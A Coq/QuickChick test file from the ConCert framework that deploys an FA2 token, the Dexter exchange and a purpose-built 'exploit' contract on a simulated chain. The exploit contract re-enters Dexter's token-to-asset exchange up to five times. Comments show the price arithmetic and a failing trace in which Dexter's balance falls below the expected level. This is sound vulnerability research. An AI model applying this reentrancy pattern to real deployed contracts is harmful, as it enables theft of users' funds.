From ConCert Require Import Blockchain FA2Token FA2Interface Dexter.
From ConCert Require Import Serializable.
From ConCert Require Import Extras.
From ConCert Require Import Containers.
From ConCert Require Import BoundedN.
From ConCert Require Import ResultMonad.
Require Import Monads.
Require Import ZArith.

From QuickChick Require Import QuickChick. Import QcNotation.
From ConCert.Execution.QCTests Require Import
  TestUtils TraceGens DexterGens.
From RecordUpdate Require Import RecordUpdate.
From Coq Require Import List.
From Coq Require Import Morphisms.

Import ListNotations.
Import RecordSetNotations.

(* the policy which allows both owners and operators to transfer tokens. *)
Definition policy_all : permissions_descriptor := {|
  descr_self := self_transfer_permitted;
  descr_operator := operator_transfer_permitted;
  descr_sender := owner_no_op;
  descr_receiver := owner_no_op;
  descr_custom := None;
|}.

Definition token_metadata_0 : token_metadata := {|
  metadata_token_id := 0%N;
  metadata_decimals := 8%N;
|}.

Definition token_setup : FA2Token.Setup := {|
  transfer_hook_addr_ := None;
  setup_total_supply := [];
  setup_tokens := FMap.add 0%N token_metadata_0 FMap.empty;
  initial_permission_policy := policy_all;
|}.

Definition deploy_fa2token : @ActionBody LocalChainBase := create_deployment 0 FA2Token.contract token_setup.
Definition fa2_caddr : Address := BoundedN.of_Z_const AddrSize 128%Z.

Definition dexter_setup : Dexter.Setup := {|
  fa2_caddr_ := fa2_caddr;
|}.

(* The Dexter contract gets 30 chain assets initially *)
Definition deploy_dexter : @ActionBody LocalChainBase := create_deployment 30 Dexter.contract dexter_setup.
Definition dexter_caddr : Address := BoundedN.of_Z_const AddrSize 129%Z.

Section ExplotContract.
Definition ExploitContractMsg := fa2_token_sender.
Definition ExploitContractState := nat.
Definition ExplotContractSetup := unit.
Definition exploit_init
            (chain : Chain)
            (ctx : ContractCallContext)
            (setup : ExplotContractSetup) : option ExploitContractState :=
  Some 1.
Definition exploit_receive (chain : Chain)
                    (ctx : ContractCallContext)
                   (state : ExploitContractState)
                   (maybe_msg : option ExploitContractMsg)
                   : option (ExploitContractState * list ActionBody) :=
  let sender := ctx.(ctx_from) in
  let caddr := ctx.(ctx_contract_address) in
  let dexter_balance := chain.(account_balance) caddr in
  match maybe_msg with
  | Some (tokens_sent param) => if 5 <? state (* repeat reentrancy up to five times *)
                                then Some (state, [])
                                else
                                  let token_exchange_msg := other_msg (tokens_to_asset {|
                                    exchange_owner := person_1;
                                    exchange_token_id := 0%N;
                                    tokens_sold := 200%N;
                                    callback_addr := caddr;
                                  |}) in
                                  Some (state + 1, [act_call dexter_caddr 0%Z (serialize _ _ token_exchange_msg)])
  | _ => Some (state, [])
  end.

Instance exploit_init_proper :
Proper (ChainEquiv ==> eq ==> eq ==> eq) exploit_init.
Proof. now subst. Qed.

Instance exploit_receive_proper :
Proper (ChainEquiv ==> eq ==> eq ==> eq ==> eq) exploit_receive.
Proof. now subst. Qed.

Definition exploit_contract : Contract ExplotContractSetup ExploitContractMsg ExploitContractState :=
build_contract exploit_init exploit_init_proper exploit_receive exploit_receive_proper.

End ExplotContract.

Definition deploy_exploit : @ActionBody LocalChainBase := create_deployment 0 exploit_contract tt.
Definition exploit_caddr : Address := BoundedN.of_Z_const AddrSize 130%Z.

Definition dexter_other_msg := @other_msg _ DexterMsg _.

Definition add_operator_all owner operator := {|
  op_param_owner := owner;
  op_param_operator := operator;
  op_param_tokens := all_tokens;
|}.

(* Setup a chain with fa2 contract, dexter contract, and exploit contract deployed.
   Also adds some tokens to person_1 and dexter contract, and adds some operators on the fa2 contract *)
Definition chain0 : ChainBuilder :=
  unpack_result (TraceGens.add_block builder_initial []).

Definition chain1 : ChainBuilder :=
  unpack_result (TraceGens.add_block chain0
  [
    build_act creator (act_transfer person_1 10) ;
    build_act creator deploy_fa2token ;
    build_act creator deploy_dexter ;
    build_act creator deploy_exploit ;
    build_act person_1 (act_call fa2_caddr 10%Z (serialize _ _ (msg_create_tokens 0%N))) ;
    build_act creator (act_call dexter_caddr 10%Z (serialize _ _ (dexter_other_msg (add_to_tokens_reserve 0%N)))) ;
    build_act person_1 (act_call fa2_caddr 0%Z  (serialize _ _ (msg_update_operators [add_operator (add_operator_all person_1 exploit_caddr);
                                                                                      add_operator (add_operator_all person_1 dexter_caddr)])))
  ]).

Definition dexter_state env := get_contract_state Dexter.State env dexter_caddr.
Definition token_state env := get_contract_state FA2Token.State env fa2_caddr.
Definition explit_state env := get_contract_state ExploitContractState env exploit_caddr.

From ConCert.Execution.QCTests Require Import DexterGens.

Module TestInfo <: DexterTestsInfo.
  Definition fa2_contract_addr := fa2_caddr.
  Definition dexter_contract_addr := dexter_caddr.
  Definition exploit_contract_addr := exploit_caddr.
  Definition gAccountAddress := elems_ person_1 test_chain_addrs.
  Definition gAccountAddrWithout (ws : list Address) :=
    let addrs := filter (fun a => negb (existsb (address_eqb a) ws)) test_chain_addrs in   
    elems_opt addrs.
End TestInfo.
Module MG := DexterGens.DexterGens TestInfo. Import MG.

Definition call_dexter owner_addr :=
  let dummy_descriptor := {|
    transfer_descr_fa2 := fa2_caddr;
    transfer_descr_batch := [];
    transfer_descr_operator := dexter_caddr;
  |} in
  build_act owner_addr (act_call exploit_caddr 0%Z (@serialize _ _ (tokens_sent dummy_descriptor))).

Definition gExploitAction : GOpt Action :=
  bindGen (elems [person_1; person_2; person_3]) (fun addr =>
    returnGenSome (call_dexter addr)
  ).

Definition gExploitChainTraceList max_acts_per_block cb length :=
  gChain cb (fun cb _ => gExploitAction) length 1 max_acts_per_block.

(* Sample (gExploitAction). *)
(* Sample (gExploitChainTraceList 1 chain1 1). *)

Definition person_1_initial_balance : Amount := account_balance chain1 person_1.

Definition dexter_liquidity : Amount := account_balance chain1 dexter_caddr.

Definition account_tokens (env : Environment) (account : Address) : N :=
  with_default 0%N (
    do state_fa2 <- token_state env ;
    do assets <- FMap.find 0%N state_fa2.(assets) ;
    FMap.find account assets.(balances)).

(* Compute (account_tokens chain1 dexter_caddr). *)
(* 1000%N *)
(* Compute (account_tokens chain1 person_1). *)
(* 1000%N *)
(* Compute person_1_initial_balance. *)
(* 0%Z *)
(* Compute dexter_liquidity. *)
(* 30%Z *)

(* This property asserts that the token reserve of the dexter contract is consistent
   with how much money has been exchanged for tokens, with respect to the conversion function 'getInputPrice' *)
Open Scope Z_scope.
Definition tokens_to_asset_correct_P_opt (env : Environment) : option Checker :=
  do state_dexter <- dexter_state env;
  let person_1_balance := account_balance env person_1 in
  let dexter_balance := account_balance env dexter_caddr in
  let dexter_initial_balance := account_balance chain1 dexter_caddr in
  let dexter_initial_token_reserve := Z.of_N (account_tokens chain1 dexter_caddr) in
  let dexter_current_token_reserve := Z.of_N (account_tokens env dexter_caddr) in
  let tokens_received := dexter_current_token_reserve - dexter_initial_token_reserve in
  let expected_currency_sold := getInputPrice tokens_received dexter_initial_token_reserve dexter_initial_balance in
  let expected_dexter_balance := dexter_initial_balance - expected_currency_sold in
  Some (
    whenFail (
      "dexter balance was " ++ show dexter_balance ++ " while it was expected to be at least " ++ show expected_dexter_balance ++ nl ++
      "person_1 balance: " ++ show person_1_balance ++ nl ++
      "person_1 tokens: " ++ show (account_tokens env person_1) ++ nl ++
      "dexter balance: " ++ show dexter_balance ++ nl ++
      "dexter tokens: " ++ show (account_tokens env dexter_caddr) ++ nl ++
      "history: " ++ show (state_dexter.(price_history))
    )
    (checker (expected_dexter_balance <? dexter_balance))
  ).

Definition tokens_to_asset_correct_P env :=
  match tokens_to_asset_correct_P_opt env with
  | Some p => p
  | None => false ==> true
  end.

Definition tokens_to_asset_correct :=
  forAllChainState 1 chain1 (gExploitChainTraceList 1) tokens_to_asset_correct_P.
(* QuickChick tokens_to_asset_correct. *)

(* Illustration of how the reentrancy attack can give the caller more money with the same amount of tokens.
   Notice how in the second sequence, the second argument remains the same, ie. it emulates the reentrancy attack. *)
(* Compute (getInputPrice 200 1000 30). *)
(* 4 *)
(* Compute (getInputPrice 200 1200 26). *)
(* 3 *)
(* Compute (getInputPrice 200 1400 23). *)
(* 2 *)
(* Compute (getInputPrice 200 1600 21). *)
(* 2 *)
(* Compute (getInputPrice 200 1800 19). *)
(* 1 *)
(* total = 12 *)

(* Compute (getInputPrice 200 1000 30). *)
(* 4 *)
(* Compute (getInputPrice 200 1000 26). *)
(* 4 *)
(* Compute (getInputPrice 200 1000 22). *)
(* 3 *)
(* Compute (getInputPrice 200 1000 19). *)
(* 3 *)
(* Compute (getInputPrice 200 1000 16). *)
(* 2 *)
(* total = 16 *)

(* QuickChick tokens_to_asset_correct. *)
(*
Begin Trace:
step_action{Action{act_from: 11%256, act_body: (act_call 130%256, 0, transferhook transfer_descriptor_param{transfer_descr_fa2: 128%256, transfer_descr_batch: [], transfer_descr_operator: 129%256})}}
End Trace
dexter balance was 14 while it was expected to be at least 16person_1 balance: 16
person_1 tokens: 0
dexter balance: 14
dexter tokens: 2000
history: [2; 3; 3; 4; 4]
*** Failed after 1 tests and 0 shrinks. (0 discards)
 *)
